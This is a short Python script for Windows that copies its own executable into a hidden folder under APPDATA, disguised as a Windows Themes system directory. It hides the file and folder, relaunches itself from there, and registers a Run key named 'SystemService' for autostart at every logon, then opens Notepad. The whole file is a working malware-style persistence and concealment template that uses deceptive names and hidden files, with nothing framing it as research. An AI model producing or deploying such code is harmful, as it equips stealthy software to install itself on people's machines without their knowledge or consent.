import os
import shutil
import subprocess
import sys
import winreg

def get_hidden_path():
    hidden_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "SystemData")
    os.makedirs(hidden_dir, exist_ok=True)
    exe_name = "hidden_program.exe"
    return os.path.join(hidden_dir, exe_name)

def copy_to_hidden_location(target_path):
    current_path = sys.executable  # Current .exe location
    if current_path != target_path:
        shutil.copyfile(current_path, target_path)
        subprocess.call(["attrib", "+h", target_path])        # Hide file
        subprocess.call(["attrib", "+h", os.path.dirname(target_path)])  # Hide folder
        os.startfile(target_path)
        sys.exit()

def add_to_startup(target_path):
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, "SystemService", 0, winreg.REG_SZ, target_path)
    winreg.CloseKey(key)

def open_notepad():
    subprocess.Popen(["notepad.exe"])

def main():
    target_path = get_hidden_path()
    copy_to_hidden_location(target_path)
    add_to_startup(target_path)
    open_notepad()

if __name__ == "__main__":
    main()
